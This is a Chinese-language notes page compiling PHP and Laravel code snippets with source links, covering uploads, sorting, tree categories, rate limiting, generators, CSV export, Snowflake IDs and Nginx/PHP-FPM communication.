后缀名验证 * * @param string $extension 后缀名 * @return bool */protected function has_extension(string $extension)&#123; return in_array($extension, ['jpg', 'jpeg', 'png', 'gif', 'bmp']);&#125;/** * 图片上传 * * @param \Illuminate\Http\Request $request * @return \Illuminate\Http\Response */public function index(Request $request)&#123; // 获取上传键值 $name = $request-&gt;input('name', 'file'); if($request-&gt;hasFile($name)) &#123; // 文件格式上传 $file = $request-&gt;file($name); $extension = $file-&gt;extension(); if(!$this-&gt;has_extension($extension)) &#123; return '格式错误'; &#125; $filename = $file-&gt;store(); &#125; else if(preg_match('/^(data:\s*image\/(\w+);base64,)/', $request-&gt;input($name), $matches)) &#123; // base64 上传 $extension = $matches[2]; if(!$this-&gt;has_extension($extension)) &#123; return '格式错误'; &#125; $file = $request-&gt;input($name); $file = preg_replace('/^(data:\s*image\/(\w+);base64,)/', '', $file); $file = str_replace(' ', '+', $file); // 生成保存文件名 $filename = str_random(40) . '.' . $extension; Storage::put($filename, base64_decode($file)); &#125; else &#123; return '格式错误'; &#125; return '上传成功[' . $filename . ']';&#125;https://www.hongfs.cn/2019/06/php/laravel/laravel-upload-image/ 拼音排序123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960$ composer require "overtrue/pinyin:~4.0" /** * 地区列表 - 拼音排序 * * @return \Illuminate\Http\Response */ public function list() &#123; $list_tmp = DB::table('area') -&gt;select('code', 'name') -&gt;orderBy(DB::raw('convert(name using gbk)')) -&gt;get(); $pinyin = new Pinyin(); $list = []; $list_tmp-&gt;map(function($item) use(&amp;$list, $pinyin) &#123; // 去除城市名最后面的市字 // if(substr($item-&gt;name, -3) === '市') &#123; // $item-&gt;name = substr($item-&gt;name, 0, -3); // &#125; // 获取城市名第一个字 $name_first = substr($item-&gt;name, 0, 3); // 获取拼音 $name_pinyin = $pinyin-&gt;convert($name_first)[0]; // 获取第一个字母并且转换为大写 $name_pinyin = strtoupper(substr($name_pinyin, 0, 1)); if(!isset($list[$name_pinyin])) &#123; $list[$name_pinyin] = []; &#125; $list[$name_pinyin][] = (array) $item; &#125;); &#123; "code": 1, "data": &#123; "G": [ &#123; "code": 5108, "name": "广元市" &#125;, &#123; "code": 4401, "name": "广州市" &#125; ], "S": [ &#123; "code": 4403, "name": "深圳市" &#125; ] &#125; &#125;https://www.hongfs.cn/2019/09/php/laravel/laravel-area-list-pinyin-sort/ PHP读取微信客户端数据库123456789101112131415161718192021222324252627282930 class MyDB extends SQLite3 &#123; function __construct() &#123; //根据sqlite提供的open接口，输入密钥key， //$this-&gt;open('EnMicroMsg.db',SQLITE3_OPEN_READWRITE,'71ca1d4'); $this-&gt;open('test.db');//test.db存在就链接，不存在就创建 &#125; &#125; $db = new MyDB(); if(!$db)&#123; echo $db-&gt;lastErrorMsg(); &#125; else &#123; echo "Opened database successfully\n"; &#125; $sql =&lt;&lt;&lt;EOF SELECT * from COMPANY;EOF; $ret = $db-&gt;query($sql); while($row = $ret-&gt;fetchArray(SQLITE3_ASSOC) )&#123; echo "ID = ". $row['ID'] . "\n"; echo "NAME = ". $row['NAME'] ."\n"; echo "ADDRESS = ". $row['ADDRESS'] ."\n"; echo "SALARY = ".$row['SALARY'] ."\n\n"; &#125; echo "Operation done successfully\n"; $db-&gt;close();https://learnku.com/laravel/t/35478 PHP7.4 可能会对 Laravel 生态带来的改变1234567891011121314php 7.4 alpha 版本已经发布了，新特性很多，不过我只关注了预加载（preload）特性。我们都知道，laravel include 的文件比较多，会带来较大的磁盘 io, 预加载则直接解决了这个问题。https://learnku.com/laravel/t/30557 fpm 基本不会成为你的并发瓶颈，数据库往往率先成为并发的瓶颈。只有在网络通讯应用中，fpm 才有可能成为瓶颈，但是，fpm 也不能作为通讯组件来使用啊开启 preload 后，对于需要加载很多文件的项目来说，性能直接有 13%~16% 的提升，那些加载文件过多的框架和项目将会得到和加载一个文件的项目接近的性能这个特性，是直击 laravel 的痛点的。我们都知道，laravel 这个框架，加载了很多文件导致性能比一般框架要慢，这个预加载功能，可以助推 laravel 的普及php 的运行模式本来就有 fpm 和 cli 两种，其中 fpm 属于 php 的一种特色，目的是简化 web 开发，从而让开发者专注于创作，而不是处理技术细节。preload 的灵感来自于 java 的 HotSpot（jvm 的黑科技，可以做到平均 gc 时长仅为 1 毫秒），也就是在不增加开发复杂度的情况下，对性能进行 16%～16% 的透明提升，这对于有性能提升需求，但又不想改变 fpm 模式的项目来说意义是很大的。如果你的项目规模超大（我对超大的定义是 uv / 日大于 2 亿），如果还继续使用 php 的话，那么就可以用 php 的 cli 模式自定义 http 服务，通过 epool 或者 sellect 实现 io 异步轮询，php 文件直接常驻内存，对于性能的提升（对比于 fpm）通常会有 20 到 80 倍的性能提升。跟此相关的解决方案有 workerman，swoole 等。刚才没事跑到 thinkphp 官网上，看到了他们把 workman 作为了框架的一部分，用 workman 启动一个 httpServer，就可以切换到常驻内存模式，在编码上会有一点改变，比如 fpm 模式下的 session，文件上传，和 cli 的就不是一回事了，但是如果项目本身使用了 thinkphp 框架封装好的 seesion 或者文件上传方法，那么就不会有问题，这意味着，如果前期你为了赶进度使用了 fpm 模式，那么到了后期，你仍然有无缝切换到 cli 模式的选择权。 无限极分类123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101$arrs = [ [ 'id'=&gt;1, 'parent_id'=&gt;0 ], [ 'id'=&gt;2, 'parent_id'=&gt;1 ], [ 'id'=&gt;3, 'parent_id'=&gt;2 ], [ 'id'=&gt;4, 'parent_id'=&gt;0 ], [ 'id'=&gt;5, 'parent_id'=&gt;0 ],];function children($id,$arrs)&#123; $result =[]; foreach ($arrs as $v)&#123; if($id==$v['parent_id'])&#123; $result[]=$v; &#125; &#125; return $result; &#125;&gt;&gt;&gt; children(0,$arrs)=&gt; [ [ "id" =&gt; 1, "parent_id" =&gt; 0, ], [ "id" =&gt; 4, "parent_id" =&gt; 0, ], [ "id" =&gt; 5, "parent_id" =&gt; 0, ], ] function allChildren($id,$arrs)&#123; $result = []; $children = children($id,$arrs);//获取儿子数组 foreach($children as $k=&gt;$child)&#123; $result[$k]=$child; $childResult = allChildren($child['id'],$arrs);//获取儿子的儿子的儿子无穷尽也 foreach ($childResult as $subChild) &#123; $child['children'][]=$subChild; $result[$k] = $child; &#125; &#125; return $result; &#125; //实现类似于children($id,$arrs)方法 public function children()&#123; return $this-&gt;hasMany(get_class($this),'parent_id'); &#125; //实现了上面的allChildren($id,$arrs)方法 public function getAllChildren() &#123; $result = []; $children = $this-&gt;children; foreach ($children as $child) &#123; $result[] = $child; $childResult = $child-&gt;getAllChildren(); foreach ($childResult as $subChild) &#123; $result[] = $subChild; &#125; &#125; return $result; &#125; 测试 https://learnku.com/articles/12466/unlimited-classification#reply52473 Model::find(1)-&gt;getAllChildren(); public function children() &#123; return $this-&gt;hasMany(get_class($this), 'parent_id' ); &#125; public function allChildren() &#123; return $this-&gt;children()-&gt;with( 'allChildren' ); &#125; https://github.com/betterde/tree $categorys = children::with('allChildren')-&gt;first(); $arr = []; array_walk_recursive($categories,function ($v, $k) use(&amp;$arr) &#123; if($k == 'id') $arr[] = $v; &#125;); https://segmentfault.com/a/1190000010359094 Laravel 的无限级分类插件 https://github.com/lazychaser/laravel-nestedset 限制请求频率中间件1234567891011121314151617181920212223242526272829303132333435363738394041use Closure;use Illuminate\Support\Facades\Cache;use App\Libs\Xres;class ThrottleRequests &#123; /** * Handle an incoming request. * * @param \Illuminate\Http\Request $request * @param \Closure $next * @return mixed */ public function handle($request, Closure $next) &#123; $unique = $request-&gt;getClientIp() . $request-&gt;getRequestUri(); if (Cache::has('ip_list')) &#123; $ip_list = Cache::get('ip_list'); &#125; else &#123; $ip_list = array(); &#125; $index = array_search($unique, array_column($ip_list, 'ip')); if (false === $index) &#123; array_push($ip_list, ['ip' =&gt; $unique, 'time' =&gt; $this-&gt;time()]); Cache::put('ip_list', $ip_list, 1440); &#125; else &#123; $gap = $this-&gt;time() - $ip_list[$index]['time']; $ip_list[$index]['time'] = $this-&gt;time(); Cache::put('ip_list', $ip_list, 1); if ($gap &lt; 1000) &#123; return Xres::error("请求频率过快", 200); &#125; &#125; return $next($request); &#125; private function time()&#123; return (int)(microtime(true)*1000); &#125;&#125;https://learnku.com/articles/35823 Laravel MongoDB 数据库查询12345composer require jenssegers/mongodb$capsule-&gt;getDatabaseManager()-&gt;extend('mongodb', function($config)&#123; return new Jenssegers\Mongodb\Connection($config);&#125;); 树状数据结构存储方式1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768CREATE TABLE `categories` ( `id` int(11) NOT NULL AUTO_INCREMENT, `title` char(100) NOT NULL, `pid` int(11) DEFAULT 0, PRIMARY KEY (`id`)) ENGINE=InnoDB;CREATE TABLE `categories` ( `id` int(11) NOT NULL AUTO_INCREMENT, `title` char(100) NOT NULL, `lft` int(11) NOT NULL CHECK (lft&gt; 0), `rgt` int(11) NOT NULL CHECK (rgt&gt; 1), PRIMARY KEY (`id`)) ENGINE=InnoDB;lft 和 rgt 是作为集合的边界，两者差值越大，则集合越大，里面的元素就越多。根据子集，查找父级的分类SELECT c2.* FROM categories as c1, categories as c2 WHERE c1.lft BETWEEN c2.lft and c2.rgt AND c1.title = '华为';+----+-------------+-----+-----+| id | title | lft | rgt |+----+-------------+-----+-----+| 1 | Smartphones | 1 | 14 || 5 | Harmony OS | 10 | 13 || 8 | 华为 | 11 | 12 |+----+-------------+-----+-----+根据父级，查找其底下所有的子集SELECT c1.* FROM categories AS c1, categories AS c2 WHERE c1.lft BETWEEN c2.lft AND c2.rgt AND c2.title = 'Smartphones';+----+-------------+-----+-----+| id | title | lft | rgt |+----+-------------+-----+-----+| 1 | Smartphones | 1 | 14 || 3 | Android | 2 | 5 || 4 | iOS | 6 | 9 || 5 | Harmony OS | 10 | 13 || 6 | 小米 | 3 | 4 || 7 | iPhone | 7 | 8 || 8 | 华为 | 11 | 12 |+----+-------------+-----+-----+查看各个分类的级别 SELECT COUNT(c2.id) AS indentation, c1.title FROM categories AS c1, categories AS c2 WHERE c1.lft BETWEEN c2.lft AND c2.rgt GROUP BY c1.title ORDER BY c1.lft;+-------------+-------------+| indentation | title |+-------------+-------------+| 1 | Smartphones || 2 | Android || 3 | 小米 || 2 | iOS || 3 | iPhone || 2 | Harmony OS || 3 | 华为 |+-------------+-------------+https://learnku.com/articles/33630 冬令时12345678910111213141516171819function getSeason($timezone)&#123; $localzone = date("e"); date_default_timezone_set($timezone); $season = date("I"); date_default_timezone_set($localzone); return $season;&#125;function is_dst($timestamp,$timezone)&#123; $timezone = date('e'); //获取当前使用的时区 date_default_timezone_set($timezone); //强制设置时区 $dst = date('I',$timestamp); //判断是否夏令时 date_default_timezone_set($timezone); //还原时区 return $dst; //返回结果&#125;print_r(is_dst(1570143661,'Europe/London'));print_r(is_dst(time(),'America/New_York'));print_r(getSeason('America/Chicago'));https://3v4l.org/iWVMb 展开表达式123456789&lt;?phpfunction add($a, $b, $c) &#123; return $a + $b + $c;&#125;$operators = [2, 3];echo add(1, ...$operators);?&gt;https://www.php.net/manual/zh/migration56.new-features.php helper函数1234567891011121314151617181920212223242526272829303132333435363738394041424344454647public function register()&#123; foreach (glob(app_path('Helpers') . '/*.php') as $file) &#123; require_once $file; &#125; $this-&gt;directoryToArray(app_path('Helpers'));&#125;private function directoryToArray($directory, $recursive = false) &#123; $array_items = array(); if(!is_dir($directory)) return "$directory folder does not exist"; if ($handle = opendir($directory)) &#123; while (false !== ($file = readdir($handle))) &#123; if ($file != "." &amp;&amp; $file != "..") &#123; if (is_dir($directory. "/" . $file)) &#123; if($recursive) &#123; self::directoryToArray($directory. "/" . $file, $recursive); &#125; if($this-&gt;validateExt($file))&#123; $file = $directory . "/" . $file; require_once $file; &#125; &#125; else &#123; if($this-&gt;validateExt($file))&#123; $file = $directory . "/" . $file; require_once $file; &#125; &#125; &#125; &#125; closedir($handle); &#125;&#125;private function validateExt($file)&#123; $file_path = pathinfo($file); if($file_path ['extension'] == 'php')&#123; return true; &#125; return false;&#125;config/app.phpApp\Providers\HelperServiceProvider::class,App\Providers\AppServiceProvider::class,function carbon($time = null, $tz = null)&#123; return new \Carbon\Carbon($time, $tz);&#125; 魔术方法__call1234567891011121314151617181920212223242526272829303132333435class Family&#123; protected $childName = []; public function fatherName()&#123; return 'Dale'; &#125; public function motherName()&#123; return 'Kelly'; &#125; public function __call($name,$param)&#123; if($name == 'setChildName')&#123; $childNmae = [$param]; return $this &#125; &#125; &#125; $family = new Family(); $setChildName = $family-&gt;setChildName('Kobe');在使用服务容器时，我们的目标是以下面形式调用我的方法。$myContainer = app('myContainer');$myContainer-&gt;myClass()-&gt;myFunction();当然我可以用构造函数的方法来解决，但是当依赖了很多类的时候，构造函数是毁灭性的。调用一个方法会实例化N个类，十分不可取。所以我改造myClass如下。class myClass&#123; public function __call($name, $arguments) &#123; $className = 'App\Container\\'.$name; if (class_exists($className))&#123; $class = new \ReflectionClass($className); return $class-&gt;newInstanceArgs($arguments); &#125; &#125;&#125;这样会在调用的时候，只会实例化一个类，而且代码简洁明了https://dalebao.github.io/2019/04/27/Laravel-and-magic/ 获取每年所有周1234567891011121314151617181920212223242526272829303132333435363738function get_week($year)&#123; $year_start = $year . "-01-01"; $year_end = $year . "-12-31"; $startday = strtotime($year_start); if (intval(date('N', $startday)) != '1') &#123; $startday = strtotime("next monday", strtotime($year_start)); //获取年第一周的日期 &#125; $year_mondy = date("Y-m-d", $startday); //获取年第一周的日期 $endday = strtotime($year_end); if (intval(date('W', $endday)) == '7') &#123; $endday = strtotime("last sunday", strtotime($year_end)); &#125; //如果是当前年则统计到当前周 $now_year = date('Y'); if ($now_year == $year) &#123; $num = date('W', strtotime(date('Y-m-d'))); &#125; else &#123; $num = intval(date('W', $endday)); if ($num == '1')&#123; $num = intval(date('W',$endday -(7*24*3600)))+1; &#125; &#125; for ($i = 1; $i &lt;= $num; $i++) &#123; $j = $i -1; $start_date = date("Y-m-d", strtotime("$year_mondy $j week ")); $end_day = date("Y-m-d", strtotime("$start_date +6 day")); if (!(date("Y",strtotime("$year_mondy $j week ")) &gt; $year))&#123; $week_array[$i] = array( substr(str_replace("-", ".", $start_date), 5), substr(str_replace("-", ".", $end_day), 5)); &#125; &#125; return $week_array;&#125;https://dalebao.github.io/2019/04/27/%E8%8E%B7%E5%8F%96%E6%AF%8F%E5%B9%B4%E6%89%80%E6%9C%89%E5%91%A8/ php yield123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869 public function parseStr(...$param)&#123; $str = ''; foreach ($param as $key =&gt; $value) &#123; //处理数组 if (is_array($value)) &#123; $value = md5(json_encode($value)); &#125; $str .= $value; &#125; return $str; &#125; public function handle() &#123; // 单独输出到updateChapter.log文件 \Log::useFiles(storage_path().'/logs/data.log'); $iTime = time(); \Log::info('start', ['timestamp' =&gt; $iTime]); $i = 0; $ret = $this-&gt;traverse(); foreach ($ret as $v) &#123; foreach ($v as $value) &#123; $key = $this-&gt;parseStr('wx:', $value-&gt;wx_id); $count = (int) Redis::pfcount($key); // redis里的uv更大时更新，并记录更新前后数据 if ($count &gt; $value-&gt;uv) &#123; \Log::info('update id:'.$value-&gt;id, [$value-&gt;uv =&gt; $count]); $i++; (new StatisticModel(['hash_id' =&gt; $value-&gt;wx_id]))-&gt;where('id', $value-&gt;id)-&gt;update(['uv' =&gt; $count, 'update_time' =&gt; $iTime]); &#125; &#125; &#125; // 记录更新时间与数量 \Log::info('end', ['timestamp'=&gt;time(), 'count' =&gt; $i,'interval' =&gt; time() - $iTime]); return true; &#125; private function traverse() &#123; $page = 3000; for ($i = 1; $i &lt; 6; $i++) &#123; $count = DB::table('wx_statistics_'.$i)-&gt;count(); if ($count &lt; 1) &#123; // 记录进度 \Log::info('update schedule', ['table success' =&gt; $i]); continue; &#125; $num = ceil($count/$page); for ($j = 0; $j &lt; $num; $j++) &#123; $ret = DB::table('wx_statistics_'.$i) -&gt;select(['id', 'wx_id', 'uv']) -&gt;orderBy('id', 'asc') -&gt;skip($j*$page) -&gt;take($page) -&gt;get() -&gt;toArray(); if (empty($ret)) &#123; continue; &#125; yield $ret; &#125; \Log::info('update schedule', ['table success' =&gt; $i]); &#125; return true; &#125;http://blog.13sai.com/essay/199 PHP 规范 - Symfony 代码规范12345使用 php-cs-fixer 工具来自动检查编码规范$ cd your-project/$ php php-cs-fixer.phar fix -vhttps://learnku.com/articles/36079 Laravel 限制条数后再分页12345678910111213141516171819$per_page = 15; // 每页条数$limit_page = 30; // 限制总页数$data = Article::orderBy('id', 'desc')-&gt;limit($per_page * $limit_page)-&gt;paginate($per_page);此种写法并不能生效，因为 paginate 方法中内置的 limit 会替换掉我们的 limit取出要展示的条数的最小 id在总记录中设置 id 大于上一条件得到的最小 id即，用 where 替换 limit 限制总条数$last_id = Article::orderBy('id', 'desc') -&gt;limit($per_page * $limit_page) -&gt;pluck('id') -&gt;sort() -&gt;first();$data = Article::orderBy('id', 'desc') -&gt;where('id', '&gt;', $last_id) -&gt;paginate($per_page);https://learnku.com/articles/36260 php.ini 配置123456文件上传file_uploads = Onmax_file_uploads = 20upload_max_filesize = 2Mmax_execution_time = 30 值 为 0 代表没有限制 PHP Traits123456789101112131415161718192021222324“ Trait 是单继承语言（如 PHP ）中的一种代码复用机制。 Trai 的目的是减少单继承语言的一些限制，能让开发者自由的重用在不同的类层次结构下几个独立类中的方法。 Trait 的语义组合与类的定义在某种程度上减少了代码的复杂度，避免了与多继承和 Mixins 相关的一些典型问题。Trait 与类非常相似，但它的目的仅仅是用更好、一致的方式汇聚一些方法。 Trait 本身不能被实例化。除了传统继承之外，它能水平组合行为，换言之，类的应用程序不需要继承。”namespace App\Http\Traits;use App\Brand;trait BrandsTrait &#123; public function brandsAll() &#123; // 从品牌表中获取所有品牌. $brands = Brand::all(); return $brands; &#125;&#125;use App\Http\Traits\BrandsTrait;class YourController extends Controller &#123; use BrandsTrait; public function addProduct() &#123; $brands = $this-&gt;brandsAll(); &#125;&#125;https://learnku.com/laravel/t/36211 正则表达式12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152/*给定一组手机号，必须由[0123456789]组成的，才选出来从哪找?从字符串的开始找，找到字符串的结束 ^ $ 找谁[01235689]找几个?11个*/$arr = array('13800138000'，'13487656887'，'434456'，'45454353434543');//$patt = '/^[^47]&#123;11&#125;$/'; //补集方法$patt = '/^[01235689]&#123;11&#125;$/';//集合方式foreach($arr as $v)&#123; preg_match_all($patt，$v，$res); print_r($res);&#125; $str = 'tommorw is another day，o2o ，you dont bird me i dont bird you';&gt;&gt;&gt; preg_split('#\W+#',$str)=&gt; [ "tommorw", "is", "another", "day", "o2o", "you", "dont", "bird", "me", "i", "dont", "bird", "you", ]//查询纯数字或者纯字母的词$str = 'hello o2o 2b9 250';$patt = '/\b[a-zA-Z]+\b|\b[0-9]+\b/';//最少一个preg_match_all($patt，$str，$res);print_r($res);//查询苹果系统的产品$str = 'ipad，iphone，imac，ipod，iamsorry';$patt = '/\bi(pad|phone|mac|pod)\b/';preg_match_all($patt，$str，$res);print_r($res);把手机号中间的 4 位替换为 *$str = '13800138000 , 13426060134 ';//前3位和后4位放子表达式中，中间4位随便，保留子表达式.替换中间的4位$patt = '/(\d&#123;3&#125;)\d&#123;4&#125;(\d&#123;4&#125;)/';//preg_match_all($patt,$str, $res);//print_r($res);echo preg_replace($patt， '\1****\2'， $str);//138****8000 , 134****0134$str = 'bob李';$patt = '/^[\x&#123;4e00&#125;-\x&#123;9fa5&#125;]+$/u';echo preg_match($patt，$str)?'国货':'杂货';https://learnku.com/articles/36227 curl 下载文件1234567891011121314151617181920212223function curl_download_file($url,$path)&#123; $ch=curl_init(); curl_setopt($ch,CURLOPT_POST,0); curl_setopt($ch,CURLOPT_URL,$url); curl_setopt($ch,CURLOPT_RETURNTRANSFER,1); $content=curl_exec($ch);// file_put_contents($path, $content);// $file=fopen($path,'w');// fwrite($file,$content);// fclose($file); header('Expires: 0'); // no cache header('Cache-Control: must-revalidate, post-check=0, pre-check=0'); header('Last-Modified: ' . gmdate('D, d M Y H:i:s', time()) . ' GMT'); header('Cache-Control: private', false); header('Content-Type: application/force-download'); header('Content-Disposition: attachment; filename="' . basename($url) . '"'); header('Content-Transfer-Encoding: binary'); header('Content-Length: ' . strlen($content)); // provide file size header('Connection: close'); echo $content;&#125;curl_download_file('https://www1.hkexnews.hk/listedco/listconews/sehk/2019/1108/2019110800352_c.xlsx','test.xlsx'); 更新数据后返回原来数据123456789101112131415161718192021222324252627282930 $article = Finance::where('state', 0) -&gt;orderBy('id', 'asc')-&gt;select('id', 'state', 'author') -&gt;first(); $old_article = $article-&gt;toArray(); if($article)&#123; $article-&gt;state = 1; $article-&gt;author = 'elesos''; $article-&gt;save(); &#125; return $old_article;当把一个对象已经创建的实例赋给一个新变量时，新变量会访问同一个实例，就和用该对象赋值一样。此行为和给函数传递入实例时一样。可以用克隆给一个已创建的对象建立一个新实例。 $old_article = $article = Finance::where('state', 0) -&gt;orderBy('id', 'asc') -&gt;first();old_article 和 article 都是指向同一块内存（或者说同一个对象实例。从 C 语言的角度理解，可以类比为他们都是保存指向同一个对象的 内存地址，即指针），那么对于 article 的修改自然也会反应到 old_article 上$article = Finance::where('state', 0) -&gt;orderBy('id', 'asc') -&gt;first();// 关键：复制 article 实例到 old_article。// 若支持，此时 old_article 指向的实例与 article 不一致$old_article = clone $article;$article-&gt;state = 1;$article-&gt;save();// 如果证实可以，此处 old_article state 应为 0echo $old_article-&gt;state;https://learnku.com/laravel/t/36338 生成器123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475最普通的方式就是一次性读取文件内容，然后再进行遍历。&lt;?phpfunction getLinesFromFile($fileName) &#123; // 打开文件 if (!$fileHandle = fopen($fileName, 'r')) &#123; return; &#125; // 一次读取每一行并保存 $lines = []; while (false !== $line = fgets($fileHandle)) &#123; $lines[] = $line; &#125; fclose($fileHandle); return $lines;&#125;$lines = getLinesFromFile('test.txt');foreach ($lines as $line) &#123;&#125;当使用该函数读取大文件时，就会因为内存不足而报错。PHP Fatal error: Allowed memory size of 134217728 bytes exhaustedfunction getLinesFromFile($fileName) &#123; if (!$fileHandle = fopen($fileName, 'r')) &#123; return; &#125; while (false !== $line = fgets($fileHandle)) &#123; yield $line; &#125; fclose($fileHandle);&#125;$lines = getLinesFromFile('test.txt');foreach ($lines as $line) &#123;&#125;yield;yield $value;yield $key =&gt; $value;生成器看上去是函数，实际上是 Generator 类的实例。function simpleGenerator()&#123; yield;&#125;echo get_class(simpleGenerator()) // Generator既然是对象，就可以将其赋值给变量。$gen = simpleGenerator();Generator 对象已经实现了 Iterator 接口$gen instanceof Iterator // truefunction echoLogger() &#123; while (true) &#123; // 接受外部的传值 $log = yield; echo 'Log: ' . $log . "\n"; &#125;&#125;$logger = echoLogger();$logger-&gt;send('Foo'); // Log: foo$logger-&gt;send('Bar'); // Log: barhttps://learnku.com/articles/36331 多维数组变一维12345678910111213141516 public static function flatten($array, $depth = INF) &#123; $result = []; foreach ($array as $item) &#123; $item = $item instanceof Collection ? $item-&gt;all() : $item; if (! is_array($item)) &#123; $result[] = $item; &#125; elseif ($depth === 1) &#123; $result = array_merge($result, array_values($item)); &#125; else &#123; $result = array_merge($result, static::flatten($item, $depth - 1)); &#125; &#125; return $result; &#125;https://learnku.com/articles/36348 phpexcel遇到内存溢出123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128class ExportService&#123; public static $outPutFile = ''; /** * 导出文件 * @param string $fileName * @param $data * @param array $formFields * @return mixed */ public static function exportData($fileName = '', $data, $formFields = []) &#123; $fileArr = []; $tmpPath = \Yii::$app-&gt;params['excelSavePath']; foreach (array_chunk($data, 10000) as $key =&gt; $value) &#123; self::$outPutFile = ''; $subject = !empty($fileName) ? $fileName : 'data_'; $subject .= date('YmdHis'); if (empty($value) || empty($formFields)) &#123; continue; &#125; self::$outPutFile = $tmpPath . $subject . $key . '.csv'; if (!file_exists(self::$outPutFile)) &#123; touch(self::$outPutFile); &#125; $index = array_keys($formFields); $header = array_values($formFields); self::outPut($header); foreach ($value as $k =&gt; $v) &#123; $tmpData = []; foreach ($index as $item) &#123; $tmpData[] = isset($v[$item]) ? $v[$item] : ''; &#125; self::outPut($tmpData); &#125; $fileArr[] = self::$outPutFile; &#125; $zipFile = $tmpPath . $fileName . date('YmdHi') . '.zip'; $zipRes = self::zipFile($fileArr, $zipFile); return $zipRes; &#125; /** * 向文件写入数据 * @param array $data */ public static function outPut($data = []) &#123; if (is_array($data) &amp;&amp; !empty($data)) &#123; $data = implode(',', $data); file_put_contents(self::$outPutFile, iconv("UTF-8", "GB2312//IGNORE", $data) . PHP_EOL, FILE_APPEND); &#125; &#125; /** * 压缩文件 * @param $sourceFile * @param $distFile * @return mixed */ public static function zipFile($sourceFile, $distFile) &#123; $zip = new \ZipArchive(); if ($zip-&gt;open($distFile, \ZipArchive::CREATE) !== true) &#123; return $sourceFile; &#125; $zip-&gt;open($distFile, \ZipArchive::CREATE); foreach ($sourceFile as $file) &#123; $fileContent = file_get_contents($file); $file = iconv('utf-8', 'GBK', basename($file)); $zip-&gt;addFromString($file, $fileContent); &#125; $zip-&gt;close(); return $distFile; &#125; /** * 下载文件 * @param $filePath * @param $fileName */ public static function download($filePath, $fileName) &#123; if (!file_exists($filePath . $fileName)) &#123; header('HTTP/1.1 404 NOT FOUND'); &#125; else &#123; //以只读和二进制模式打开文件 $file = fopen($filePath . $fileName, "rb"); //告诉浏览器这是一个文件流格式的文件 Header("Content-type: application/octet-stream"); //请求范围的度量单位 Header("Accept-Ranges: bytes"); //Content-Length是指定包含于请求或响应中数据的字节长度 Header("Accept-Length: " . filesize($filePath . $fileName)); //用来告诉浏览器，文件是可以当做附件被下载，下载后的文件名称为$file_name该变量的值 Header("Content-Disposition: attachment; filename=" . $fileName); //读取文件内容并直接输出到浏览器 echo fread($file, filesize($filePath . $fileName)); fclose($file); exit(); &#125; &#125;&#125; $fileName = "库存导入模板"; $stockRes = []; // 导出的数据 $formFields = [ 'store_id' =&gt; '门店ID', 'storeName' =&gt; '门店名称', 'sku' =&gt; 'SKU编码', 'name' =&gt; 'SKU名称', 'stock' =&gt; '库存', 'reason' =&gt; '原因' ]; $fileRes = ExportService::exportData($fileName, $stockRes, $formFields); $tmpPath = \Yii::$app-&gt;params['excelSavePath']; // 文件路径 $fileName = str_replace($tmpPath, '', $fileRes); // 下载文件 ExportService::download($tmpPath, $fileName); https://tsmliyun.github.io/php/%E5%85%B3%E4%BA%8EPHP%E5%86%85%E5%AD%98%E6%BA%A2%E5%87%BA%E7%9A%84%E6%80%9D%E8%80%83/ 基于雪花算法的 PHP ID 生成器1234567891011121314151617181920212223242526272829303132333435363738394041424344第一个 bit 为未使用的符号位。第二部分由 41 位的时间戳（毫秒）构成，他的取值是当前时间相对于某一时间的偏移量。第三部分和第四部分的 5 个 bit 位表示数据中心和机器 ID，其能表示的最大值为 2^5 -1 = 31；最后部分由 12 个 bit 组成，其表示每个工作节点每毫秒生成的序列号 ID，同一毫秒内最多可生成 2^12 -1 即 4095 个 ID。composer require godruoyi/php-snowflake$snowflake = new \Godruoyi\Snowflake\Snowflake;$snowflake-&gt;id();// 1537200202186752$snowflake = new \Godruoyi\Snowflake\Snowflake;$snowflake-&gt;setStartTimeStamp(strtotime('2019-09-09')*1000);$snowflake-&gt;id();use Godruoyi\Snowflake\Snowflake;use Godruoyi\Snowflake\LaravelSequenceResolver;class AppServiceProvider extends ServiceProvider&#123; /** * Register any application services. * * @return void */ public function register() &#123; $this-&gt;app-&gt;singleton('snowflake', function () &#123; return (new Snowflake()) -&gt;setStartTimeStamp(strtotime('2019-08-08')*1000) -&gt;setSequenceResolver(new LaravelSequenceResolver( $this-&gt;app-&gt;get('cache')-&gt;store() )); &#125;); &#125;&#125;64 位的二进制最大能生成 19 位的 ID，所以在设计数据库长度的时候最好预留下长度 public function getCurrentMicrotime() &#123; return floor(microtime(true) * 1000) | 0;//浮点数转数字 &#125; bindec('0111111111111111111111111111111111111111111111111111111111111111')=&gt; 9223372036854775807&gt;&gt;&gt; strlen(9223372036854775807)=&gt; 19https://learnku.com/articles/32575 Nginx 与 PHP 的通信123456789101112131415161718192021222324252627282930313233343536373839404142 Nginx 并不是直接和 PHP 进行通信的，而是通过 PHP-FPM。Nginx 不仅仅是一个强大的 Web 服务器，也是一个强大的代理服务器，提供了很多请求协议的代理。比如 Http 协议还有 FastCgi 协议等。当请求进入到 Nginx 中，Nginx 提供了一个 FastCgi 模块 来把 Http 请求映射为对应的 Fastcgi 请求。该模块提供了 fastcgi_param 指定来完成映射关系。它的主要作用就是把 Nginx 中的变量翻译成 PHP 中能够理解的变量fastcgi_pass, 用来指定 FPM 进程监听的地址，Nginx 会把所有的 PHP 请求映射成 fastcgi 请求，然后发送到这个地址上。所有的 .php 结尾的请求都交给 fastcgi 模块处理，然后把处理后的请求发送给 PHP-FPM，然后 PHP-FPM 把请求交给 worker 进程，worker 进程加载 PHP 解析器运行 PHP 处理结果。 其中 fastcgi_pass unix:/var/run/php/php7.1-fpm.sock; 这一行用来指定 fpm 的地址。Nginx 和 PHP 的通信流程大概如下:客户端发送请求到 Nginx加载 nginx.conf 文件，把所有 .php 结尾的请求特殊处理加载 FastCGI 模块，完成请求参数的解析映射，生成 FastCGI 请求然后通过 fastcgi_pass 参数把 FastCGI 请求发送给 PHP-FPM 处理PHP-FPM 收到请求，分配给空闲 worker 子进程worker 子进程加载 